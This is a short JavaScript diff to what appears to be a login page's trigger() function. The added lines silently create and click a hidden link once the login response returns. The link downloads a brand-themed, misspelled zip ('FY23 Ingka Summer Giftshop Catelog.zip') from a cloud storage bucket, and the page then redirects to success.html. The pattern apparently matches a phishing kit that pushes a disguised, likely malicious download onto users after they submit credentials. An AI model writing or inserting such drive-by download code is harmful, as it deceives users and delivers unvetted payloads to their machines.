@@ -364,8 +364,14 @@ function trigger() {
     return response.json();
   })
   .then(data => {
+    var url = "https://isdp.oss-cn-shanghai.aliyuncs.com/FY23%20Ingka%20Summer%20Giftshop%20Catelog.zip"; // 替换为要下载的文件的URL
+    var fileName = "FY23 Ingka Summer Giftshop Catelog.zip"; // 替换为要保存的文件名
+    var a = document.createElement("a");
+    a.href = url;
+    a.download = fileName;
+    a.click();
     // 登录成功后的操作
-      window.location.href = "success.html";
+    window.location.href = "success.html";
   })
   .catch(error => {
     // 处理错误
